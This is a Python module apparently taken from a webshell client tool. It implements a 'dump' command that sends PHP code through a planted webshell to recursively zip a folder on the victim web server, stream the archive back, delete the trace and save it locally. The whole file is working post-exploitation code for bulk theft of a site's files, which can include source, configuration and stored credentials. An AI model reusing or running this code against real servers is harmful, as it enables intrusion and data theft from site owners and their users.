from libs.config import alias, color, gget
from libs.myapp import send
from os import path, makedirs


def get_raw_php(web_file_path: str):
    with open(path.join(gget("root_path"), "phpfiles", "zip.php"), "r", encoding="utf-8") as f:
        text = f.read() % web_file_path.strip("\\")
    text = text.replace("<?php\n", "")
    return text


def get_zip_php(web_file_path: str):
    return (
        """function addFileToZip($path, $zip) {
$sp = DIRECTORY_SEPARATOR;
$handler = opendir($path);
while (($filename = readdir($handler)) !== false) {
if ($filename != "." && $filename != "..") {
if (is_dir($path.$sp.$filename)){
addFileToZip($path.$sp.$filename, $zip);
} else {
$zip->addFile($path.$sp.$filename);
}
}
}
@closedir($path);
}
if (class_exists("ZipArchive")){
$zip = new ZipArchive();
$file_name = $_SERVER["HTTP_HOST"].".zip";
if ($zip->open($file_name, ZipArchive::CREATE) === TRUE) {
addFileToZip("%s", $zip);
$zip->close();
$fp=fopen($file_name,"r");
$file_size=filesize($file_name);
Header("Content-type: application/octet-stream");
Header("Accept-Ranges: bytes");
Header("Accept-Length:".$file_size);
Header("Content-Disposition: attachment; filename=$file_name");
$buffer=1024;
$file_count=0;
while(!feof($fp) && $file_count<$file_size){
$file_con=fread($fp,$buffer);
$file_count+=$buffer;
echo $file_con;
}
fclose($fp);
if($file_count >= $file_size) {
unlink($file_name);
}
}
}
"""
        % web_file_path.strip("\\")
    )


@alias(True, _type="FILE", w="web_file_path", l="local_path")
def run(web_file_path: str, local_path: str = "", _use_raw_php_to_zip: bool = True):
    """
    dump

    Package and compress files in a folder and download it.

    eg: dump {web_file_path} {local_path=./site.com/...}
    """
    if _use_raw_php_to_zip:
        php = get_raw_php(web_file_path)
    else:
        php = get_zip_php(web_file_path)
    res = send(php)
    if (not res):
        return
    content = res.r_content
    download_path = local_path or gget("webshell.download_path", "webshell")
    if len(content) and res.status_code == 200:
        file_name = (
            gget("webshell.netloc", "webshell") + ".zip"
            if (not len(local_path))
            else ""
        )
        if not path.exists(download_path):
            makedirs(download_path)
        file_path = path.join(download_path, file_name).replace("\\", "/")
        with open(file_path, "wb") as f:
            f.write(content)
        print(color.green(f"Downloaded file has been saved to {file_path}"))
    else:
        print(color.red("File not exist / Download error"))
